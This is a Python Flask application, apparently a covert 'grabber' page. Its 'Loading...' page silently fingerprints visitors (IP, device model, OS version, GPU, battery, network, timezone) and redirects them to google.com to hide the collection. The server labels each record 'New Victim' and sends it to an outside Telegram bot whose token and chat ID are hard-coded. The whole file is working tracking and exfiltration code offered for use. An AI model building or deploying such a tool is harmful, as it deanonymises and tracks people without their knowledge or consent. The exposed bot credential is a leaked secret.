from flask import Flask, request, render_template_string, redirect
import urllib.parse
import urllib.request
import json
import re
import requests

app = Flask(__name__)

BOT_TOKEN = "8823855710:AAH9couwpgdq8EaHou8pnOAoVCYDBs7LydE"
CHAT_ID = "8374289893"

LATEST_ANDROID = 15
LATEST_IOS = 18

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
</head>
<body>
<script>
async function getDeviceInfo() {
    let info = {};

    info.userAgent = navigator.userAgent;
    info.platform = navigator.platform;
    info.language = navigator.language;
    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    info.online = navigator.onLine;
    info.cookiesEnabled = navigator.cookieEnabled;
    info.screenWidth = screen.width;
    info.screenHeight = screen.height;
    info.colorDepth = screen.colorDepth;
    info.touchPoints = navigator.maxTouchPoints || 0;
    info.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    info.deviceMemory = navigator.deviceMemory || 'unknown';
    info.plugins = navigator.plugins ? navigator.plugins.length : 0;

    // High entropy — HTTPS par hi kaam karta hai
    let highEntropy = {};
    try {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            highEntropy = await navigator.userAgentData.getHighEntropyValues([
                'platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion', 'fullVersionList'
            ]);
            info.highEntropy = {
                platform: highEntropy.platform || null,
                platformVersion: highEntropy.platformVersion || null,
                architecture: highEntropy.architecture || null,
                model: highEntropy.model || null,
                uaFullVersion: highEntropy.uaFullVersion || null,
                fullVersionList: highEntropy.fullVersionList || null
            };
            info.highEntropyAvailable = true;
        } else {
            info.highEntropy = null;
            info.highEntropyAvailable = false;
        }
    } catch(e) {
        info.highEntropy = null;
        info.highEntropyAvailable = false;
    }

    // Connection
    if (navigator.connection) {
        info.connectionType = navigator.connection.effectiveType || 'unknown';
        info.downlink = navigator.connection.downlink || 0;
        info.rtt = navigator.connection.rtt || 0;
        info.savedata = navigator.connection.saveData || false;
    } else {
        info.connectionType = 'unknown';
        info.downlink = 0;
        info.rtt = 0;
        info.savedata = false;
    }

    // Battery
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            info.batteryLevel = Math.round(battery.level * 100) + '%';
            info.charging = battery.charging;
        }
    } catch(e) {
        info.batteryLevel = 'unavailable';
    }

    // Browser
    info.browser = (function() {
        const ua = navigator.userAgent;
        if (ua.includes('Edg/')) return 'Edge';
        if (ua.includes('OPR/') || ua.includes('Opera')) return 'Opera';
        if (ua.includes('Chrome/')) return 'Chrome';
        if (ua.includes('Firefox/')) return 'Firefox';
        if (ua.includes('Safari/') && !ua.includes('Chrome')) return 'Safari';
        return 'Unknown';
    })();

    // GPU
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            // GPU vendor
            const vendorDebug = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpuVendor = vendorDebug ? gl.getParameter(vendorDebug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        } else {
            info.gpu = 'unavailable';
            info.gpuVendor = 'unavailable';
        }
    } catch(e) {
        info.gpu = 'unavailable';
        info.gpuVendor = 'unavailable';
    }

    // Screen density
    info.devicePixelRatio = window.devicePixelRatio || 1;

    // OpenGL ES version
    try {
        const canvas2 = document.createElement('canvas');
        const gl2 = canvas2.getContext('webgl2');
        info.webgl2 = gl2 ? 'Yes' : 'No';
    } catch(e) {
        info.webgl2 = 'Unknown';
    }

    return info;
}

async function sendData() {
    try {
        const info = await getDeviceInfo();
        await fetch('/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        });
    } catch(e) {
        // silently fail
    }
    window.location.replace('https://google.com');
}

sendData();
</script>
</body>
</html>
"""

def get_external_ip(ip):
    if ip.startswith('100.64.') or ip.startswith('100.78.') or ip.startswith('100.11'):
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=3)
            return r.json().get('ip', ip)
        except:
            return ip
    return ip

def parse_os(ua):
    if 'Android' in ua:
        return 'Android'
    if 'iPhone' in ua or 'iPad' in ua or 'iOS' in ua:
        return 'iOS'
    if 'Windows NT' in ua:
        return 'Windows'
    if 'Mac OS X' in ua:
        return 'macOS'
    if 'Linux' in ua:
        return 'Linux'
    return 'Unknown'

def parse_android_version(ua, high_entropy):
    if high_entropy:
        pv = high_entropy.get('platformVersion')
        if pv:
            match = re.match(r'(\d+)', str(pv))
            if match:
                return match.group(1)
        
        fvl = high_entropy.get('fullVersionList')
        if fvl and isinstance(fvl, list):
            for item in fvl:
                brand = item.get('brand', '').lower()
                version = item.get('version', '')
                if 'android' in brand and version:
                    return version.split('.')[0]

    ua_match = re.search(r'Android\s([0-9]+(?:\.[0-9]+)*)', ua)
    if ua_match:
        ver = ua_match.group(1).split('.')[0]
        if ver == '10':
            chrome_match = re.search(r'Chrome/(\d+)', ua)
            if chrome_match and int(chrome_match.group(1)) >= 85:
                return '10 (UA hidden, high entropy unavailable)'
        return ver
    
    return 'unknown'

def parse_model(high_entropy, ua, gpu, gpu_vendor):
    # 1. High entropy model — most accurate
    if high_entropy:
        model = high_entropy.get('model')
        if model and model.strip() and model.strip().lower() != 'unknown':
            return model.strip()

    # 2. UA Build fallback
    ua_model = re.search(r'\(([^)]+)\)', ua)
    if ua_model:
        parts = ua_model.group(1).split(';')
        skip_words = ['linux', 'android', 'k', 'wv', 'windows', 'mac os x', 'iphone', 'ipad']
        for part in parts:
            part = part.strip()
            if part and not any(word in part.lower() for word in skip_words):
                return part

    # 3. GPU-based hint
    if gpu and gpu != 'unavailable':
        gpu_lower = gpu.lower()
        if 'adreno' in gpu_lower:
            # Adreno GPU — Qualcomm devices (Xiaomi, OnePlus, Realme, etc.)
            match = re.search(r'adreno\s*(\d+)', gpu_lower)
            if match:
                adreno_num = int(match.group(1))
                if adreno_num >= 740:
                    return 'Snapdragon 8 Gen device (Adreno ' + match.group(1) + ')'
                elif adreno_num >= 700:
                    return 'Snapdragon 7 Gen device (Adreno ' + match.group(1) + ')'
                else:
                    return 'Qualcomm device (Adreno ' + match.group(1) + ')'
        elif 'mali-g' in gpu_lower:
            match = re.search(r'mali-g(\d+)', gpu_lower)
            if match:
                mali_num = int(match.group(1))
                if mali_num >= 600:
                    return 'Exynos/Dimensity flagship (Mali-G' + match.group(1) + ')'
                else:
                    return 'Exynos/MediaTek device (Mali-G' + match.group(1) + ')'
        elif 'apple' in gpu_lower:
            return 'Apple device'
    
    return 'unknown'

def detect_brand(model, gpu_vendor):
    model_lower = model.lower()
    brand_map = {
        'samsung': 'SAMSUNG',
        'galaxy': 'SAMSUNG',
        'xiaomi': 'XIAOMI',
        'redmi': 'XIAOMI',
        'mi ': 'XIAOMI',
        'poco': 'POCO',
        'oneplus': 'ONEPLUS',
        'oppo': 'OPPO',
        'vivo': 'VIVO',
        'realme': 'REALME',
        'motorola': 'MOTOROLA',
        'moto': 'MOTOROLA',
        'nokia': 'NOKIA',
        'sony': 'SONY',
        'google': 'GOOGLE',
        'pixel': 'GOOGLE',
        'iphone': 'APPLE',
        'infinix': 'INFINIX',
        'tecno': 'TECNO',
        'asus': 'ASUS',
        'lenovo': 'LENOVO',
        'honor': 'HONOR',
        'huawei': 'HUAWEI',
    }
    for key, brand in brand_map.items():
        if key in model_lower:
            return brand

    # GPU vendor se guess
    if 'snapdragon' in model_lower or 'qualcomm' in model_lower:
        return 'QUALCOMM DEVICE'
    if 'exynos' in model_lower:
        return 'SAMSUNG (Exynos)'
    if 'mediatek' in model_lower or 'dimensity' in model_lower:
        return 'MEDIATEK DEVICE'
    if 'apple' in model_lower:
        return 'APPLE'

    return 'Unknown'

def parse_network_type(connection_type, downlink, rtt):
    ct = connection_type.lower()

    if ct == '4g':
        return '4G'
    if ct == '5g':
        return '5G'
    if ct == '3g':
        if downlink >= 5:
            return '4G (speed suggests)'
        elif downlink >= 1.5:
            return '3G'
        else:
            return '3G (weak)'
    if ct == '2g':
        return '2G/EDGE'
    if ct == 'slow-2g':
        return '2G (very slow)'

    if downlink >= 20:
        return '4G/5G'
    elif downlink >= 10:
        return '4G'
    elif downlink >= 3:
        return '3G/4G'
    elif downlink > 0:
        return 'Slow connection'
    return 'unknown'

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json(force=True)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    real_ip = get_external_ip(ip)

    ua = data.get('userAgent', '')
    high_entropy = data.get('highEntropy')
    high_entropy_available = data.get('highEntropyAvailable', False)
    gpu = data.get('gpu', 'unavailable')
    gpu_vendor = data.get('gpuVendor', 'unavailable')
    
    os_name = parse_os(ua)
    
    if os_name == 'Android':
        os_ver = parse_android_version(ua, high_entropy)
    elif os_name == 'iOS':
        match = re.search(r'OS\s([0-9]+(?:_[0-9]+)*)', ua)
        os_ver = match.group(1).replace('_', '.') if match else 'unknown'
    elif os_name == 'Windows':
        match = re.search(r'Windows NT\s([0-9.]+)', ua)
        os_ver = match.group(1) if match else 'unknown'
    else:
        os_ver = 'unknown'
    
    model = parse_model(high_entropy, ua, gpu, gpu_vendor)
    brand = detect_brand(model, gpu_vendor)
    
    network = parse_network_type(
        data.get('connectionType', 'unknown'),
        data.get('downlink', 0),
        data.get('rtt', 0)
    )

    update_status = 'Unknown'
    try:
        clean_ver = re.match(r'(\d+)', str(os_ver))
        if clean_ver:
            major = int(clean_ver.group(1))
            if os_name == 'Android':
                if major >= LATEST_ANDROID:
                    update_status = '✅ Updated'
                elif major == LATEST_ANDROID - 1:
                    update_status = '⚠️ 1 version behind'
                else:
                    update_status = f'❌ Outdated ({LATEST_ANDROID - major} versions behind)'
            elif os_name == 'iOS':
                if major >= LATEST_IOS:
                    update_status = '✅ Updated'
                else:
                    update_status = f'❌ Outdated (latest: {LATEST_IOS})'
    except:
        pass

    # HTTPS warning
    https_note = ''
    if not high_entropy_available:
        https_note = '\n⚠️ *High entropy unavailable — HTTPS use karo (ngrok https / Render)*'

    msg = f"""
📱 *Device Info — New Victim*

👤 *IP:* `{real_ip}`
📟 *Brand:* `{brand}`
📟 *Model:* `{model}`
📵 *OS:* `{os_name} {os_ver}`
🔄 *Update Status:* `{update_status}`
🌐 *Browser:* `{data.get('browser', 'Unknown')}`
🖥 *Screen:* `{data.get('screenWidth', '?')}x{data.get('screenHeight', '?')}`
👆 *Touch Points:* `{data.get('touchPoints', '?')}`
🧠 *RAM:* `{data.get('deviceMemory', '?')} GB`
🔋 *Battery:* `{data.get('batteryLevel', '?')}` charging: `{data.get('charging', '?')}`
📶 *Network:* `{network}` (downlink: {data.get('downlink', '?')} Mbps, rtt: {data.get('rtt', '?')}ms)
🎮 *GPU:* `{gpu}` (vendor: {gpu_vendor})
🗣 *Language:* `{data.get('language', '?')}`
🕐 *Timezone:* `{data.get('timezone', '?')}`
🛠 *CPU Cores:* `{data.get('hardwareConcurrency', '?')}`
📱 *WebGL2:* `{data.get('webgl2', 'Unknown')}`
{https_note}

*UserAgent:*
`{ua[:300]}`
"""
    send_to_telegram(msg)
    return '', 204

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'Markdown'
    }
    data = urllib.parse.urlencode(payload).encode('utf-8')
    try:
        urllib.request.urlopen(url, data=data)
    except:
        pass

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)